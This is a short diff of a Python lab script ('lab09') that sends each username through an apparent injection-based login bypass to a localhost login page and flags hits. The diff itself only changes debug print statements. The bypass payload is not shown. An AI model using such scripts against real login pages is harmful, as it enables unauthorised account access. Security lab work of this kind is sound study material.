@@ -48,16 +48,20 @@ usernames = {
 url = "http://localhost/lab09/login.php"
 
 for username in usernames:
-    print(username + "...")
+    # print(username + "...")
     username = inject_bypass(username)
+    # print(username)
 
     params = {
         "u": username,
         "p": ""
     }
 
+    print()
     response = send_request(params, url)
-    # print(response)
+
+    print(response)
+
     if(not("invalid" in response.decode('utf-8'))):
         print("\n")
         print("\thit!")
